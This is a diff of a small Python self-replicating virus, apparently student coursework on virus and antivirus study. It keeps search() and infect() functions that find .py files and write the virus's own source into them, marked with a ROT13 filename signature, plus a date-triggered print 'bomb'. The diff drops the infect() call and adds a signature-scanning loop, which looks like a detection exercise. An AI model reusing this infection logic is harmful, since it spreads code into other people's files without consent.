@@ -1,7 +1,8 @@
-import os
+'''P:\Hfref\nuandiv\pynffrf\rpf189z\cbylzbecuvp_ivehf\/nagvivehf.cl'''import os
 import datetime
 import codecs
-
+#SIGNATURE = str(codecs.encode(__file__, 'rot_13'))
+# signature is filename with ro13 shift
 def search(path):
     filestoinfect = []
     filelist = os.listdir(path)
@@ -11,7 +12,7 @@ def search(path):
         elif fname[-3:] == ".py":
             infected = False
             for line in open(path+"/"+fname):
-                if str(codecs.encode(fname, 'rot_13')) in line: # signature is filename with ro13 shift
+                if str(codecs.encode(fname, 'rot_13')) in line:
                     infected = True
                     break
             if infected == False:
@@ -25,7 +26,7 @@ def infect(filestoinfect):
             virusstring += line
     virus.close
     for fname in filestoinfect:
-        signature = "'''"+str(codecs.encode(fname, 'rot_13'))+"'''"+'\n'
+        signature = "'''"+str(codecs.encode(fname, 'rot_13'))+"'''"
         f = open(fname)
         temp = f.read()
         f.close()
@@ -35,7 +36,10 @@ def infect(filestoinfect):
 def bomb():
     if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
         print("HAPPY BIRTHDAY CRANKLIN!")
-        
-filestoinfect = search(os.path.abspath("")+"\\python_virus")
-infect(filestoinfect)
-bomb()
+filestoinfect = search(os.path.abspath("")+"\\")
+import os
+filelist = os.listdir("C:/Users/ahnaqvi/classes/ecs189m/python_virus")
+SIGNATURE = "CRANKLIN PYTHON VIRUS"
+for fname in filelist:
+    if SIGNATURE in open(fname).read():
+        print(fname)
